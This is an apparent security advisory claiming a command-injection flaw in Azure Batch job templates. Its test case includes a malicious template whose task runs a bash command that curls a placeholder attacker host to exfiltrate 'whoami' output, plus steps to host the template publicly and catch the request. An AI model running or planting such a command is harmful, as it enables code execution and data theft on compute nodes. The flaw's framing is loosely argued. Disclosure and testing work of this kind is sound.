- Vulnerability Name: Command Injection in Job Templates

- Description:
  1. An attacker crafts a malicious `job.template.json` file.
  2. Within this template, the attacker injects arbitrary commands into task definitions. This can be achieved by manipulating parameters that are used to construct the task command line or directly within the command line definition itself.
  3. A user, intending to utilize Azure Batch templates from this repository, imports and uses the malicious template through either Batch Explorer or Azure Batch CLI extensions.
  4. When a job is created and tasks are executed based on this tampered template, the injected commands are executed on the Azure Batch compute nodes as part of the task execution.

- Impact:
  - Successful exploitation allows for arbitrary code execution on Azure Batch compute nodes.
  - This can lead to a range of severe consequences, including:
    - Data exfiltration from the compute nodes or connected storage accounts.
    - Unauthorized access to and manipulation of the Azure Batch environment.
    - Lateral movement to other Azure resources if the compute nodes have sufficient permissions.
    - Complete compromise of the compute node, potentially allowing the attacker to establish persistence or use it for further attacks.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - None. The project itself focuses on providing templates and does not include any mitigation logic. The responsibility for mitigating this vulnerability lies with the tools that consume these templates (Batch Explorer and Azure Batch CLI extensions).

- Missing Mitigations:
  - Input validation and sanitization within Batch Explorer and Azure Batch CLI extensions are crucial. These tools should:
    - Thoroughly validate all fields in `job.template.json` and `pool.template.json` before using them to create Azure Batch resources.
    - Sanitize parameters and command line arguments to prevent command injection.
    - Implement a secure parsing mechanism for templates that avoids direct execution of potentially malicious content.
    - Consider using a sandboxed environment or restricted execution context for tasks created from templates, although this might be a feature of Azure Batch itself rather than the template consumers.

- Preconditions:
  - An attacker needs to be able to host or distribute a malicious `job.template.json` file. This could be achieved by:
    - Compromising the template repository itself (if possible).
    - Hosting the malicious template on a separate, publicly accessible location and tricking users into using it.
    - Social engineering to convince a user to download and import a malicious template from an untrusted source.
  - A user must then import and utilize this malicious template through Batch Explorer or Azure Batch CLI extensions while managing their Azure Batch account.

- Source Code Analysis:
  - The provided project files do not contain the source code for Batch Explorer or Azure Batch CLI extensions. Therefore, a direct code analysis to pinpoint the vulnerable code within those tools is not possible based on these files alone.
  - However, the vulnerability is evident in the design: `job.template.json` files allow defining task command lines using JSON structures. These command lines are then directly interpreted and executed by the Azure Batch service on the compute nodes.
  - Reviewing files like `/code/templates/blender/scripts/python-task-manager.py` and `/code/templates/blender/scripts/setup-linux-pool.sh` shows that these scripts are designed to be executed as part of tasks defined in templates. If a template is crafted to manipulate environment variables or command line arguments used by these scripts, or to replace these scripts with malicious ones, command injection is possible.
  - The `runner` directory's scripts like `Runner.py` and `test_manager.py` are used for testing templates, but they do not introduce or mitigate the command injection vulnerability itself. They highlight the mechanism by which templates are processed and executed, reinforcing the potential for command injection if templates are not securely handled by Batch Explorer or Azure Batch CLI extensions.

- Security Test Case:
  1. **Create a Malicious Job Template:**
     - Create a `malicious_job.template.json` file with the following content (example for Linux):
       ```json
       {
         "job": {
           "properties": {
             "taskFactory": {
               "type": "taskPerNode",
               "tasks": [
                 {
                   "id": "malicious-task",
                   "commandLine": "/bin/bash -c 'mkdir /tmp/pwned && curl http://attacker.example.com/exfiltrate?pwned=$(whoami)'"
                 }
               ]
             }
           }
         }
       }
       ```
       - This template defines a task that will:
         - Create a directory `/tmp/pwned` on the compute node (as a marker of execution).
         - Make an HTTP request to `http://attacker.example.com/exfiltrate` sending the output of the `whoami` command as a parameter. Replace `attacker.example.com` with a server you control to capture the exfiltrated data.
  2. **Host the Malicious Template:**
     - Upload `malicious_job.template.json` to a publicly accessible web server or a GitHub repository (e.g., create a public gist or a simple GitHub repo). Let's assume you host it at `https://attacker.example.com/malicious_templates/malicious_job.template.json`.
  3. **Configure Batch Explorer (or Azure Batch CLI extensions):**
     - If using Batch Explorer, manually import the `malicious_job.template.json` file using the "Local Templates" option.
     - If using Azure Batch CLI extensions, you would typically use these templates programmatically; for testing, simulate the import process as closely as possible to how a user would use it.
  4. **Create and Run a Job:**
     - Using Batch Explorer or Azure Batch CLI extensions, create a new job based on the imported `malicious_job.template.json` template. Ensure you have a valid Azure Batch pool to run the job on.
  5. **Monitor for Command Execution:**
     - **Option 1: Check Task Logs:** After the task runs, examine the `stdout.txt` or `stderr.txt` for the "malicious-task" in Batch Explorer. You should see output related to the commands executed (`mkdir` and `curl`).
     - **Option 2: Monitor Attacker's Server:** Set up a simple HTTP listener (e.g., using `netcat` or `Python's http.server`) on `attacker.example.com`. Run the job and check the logs of your HTTP listener. You should receive a request from the Azure Batch compute node, and the `whoami` command output should be present in the request parameters, confirming command injection and execution.
  6. **Verification:**
     - If you successfully receive the HTTP request with the `whoami` output on your server, or if you see evidence of the commands executed in the task logs, the command injection vulnerability is confirmed.
